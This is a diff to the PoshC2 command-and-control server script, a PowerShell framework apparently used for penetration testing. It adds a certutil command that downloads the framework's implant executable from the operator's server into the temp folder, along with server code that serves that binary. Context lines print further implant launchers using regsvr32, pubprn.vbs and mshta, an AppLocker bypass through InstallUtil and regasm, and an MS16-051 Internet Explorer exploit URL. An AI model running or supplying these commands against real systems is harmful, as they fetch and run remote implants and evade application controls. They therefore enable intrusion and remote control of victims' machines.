@@ -38,6 +38,7 @@ $global:newdir = $null
 $ipv4address = $null
 $randomuriarray = @()
 $taskiddb = 1 
+$exe = $false
 
 # used to generate random uri for each implant
 function Get-RandomURI 
@@ -304,19 +305,21 @@ if ($RestartC2Server)
     Write-Host "To quickly get setup for internal pentesting, run:"
 
     write-host $shortcut `n -ForegroundColor green
-    Write-Host "For a more stealthy approach, use SubTee's exploits, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
+    write-Host "For a more stealthy approach, use SubTee's exploits, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
     write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
     write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
     write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`")(window.close)" -ForegroundColor green
     write-host ""
-    Write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
+    write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
-    Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
+    write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
     write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
-
+    write-Host "To download PoshC2 InstallUtil/General executable use the following URL:"
+    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/webapp/static/$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
+    write-host ""
 
     #launch a new powershell session with the implant handler running
     Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
@@ -692,18 +695,22 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
     Write-Host "To quickly get setup for internal pentesting, run:"
 
     write-host $shortcut `n -ForegroundColor green
-    Write-Host "For a more stealthy approach, use SubTee's exploits, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
+    write-Host "For a more stealthy approach, use SubTee's exploits, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
     write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
     write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
     write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`")(window.close)" -ForegroundColor green
     write-host ""
-    Write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
+    write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
-    Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
+    write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
     write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
+    write-Host "To download PoshC2 InstallUtil/General executable use the following URL:"
+    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/webapp/static/$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
+    write-host ""
+
     # call back command
     
     Write-Host -Object "For " -NoNewline
@@ -834,6 +841,17 @@ while ($listener.IsListening)
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/cs_sct.xml")){
             $message = [IO.File]::ReadAllText("$global:newdir/payloads/cs_sct.xml")
+        }else {
+            $message = $httpresponse
+        }
+
+    }
+    if ($request.Url -match "/webapp/static/$($downloaduri)_iu$") 
+    {
+
+        if ([System.IO.File]::Exists("$global:newdir/payloads/posh.exe")){
+            $exe = $true
+            $message = Get-Content "$global:newdir/payloads/posh.exe" -Encoding byte
         }else {
             $message = $httpresponse
         }
@@ -1705,8 +1723,12 @@ $message =[Convert]::ToBase64String($Bytes)
         Write-Output (Get-Date) | Out-File $global:newdir\Webserver.log -Append
         Write-Output $request | Out-File $global:newdir\Webserver.log -Append
     }
-    
-    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+    if ($exe) {
+        $buffer = $message
+        $exe = $false
+    } else {
+        [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+    }
     $response.ContentLength64 = $buffer.length
     $response.StatusCode = 200
     $response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
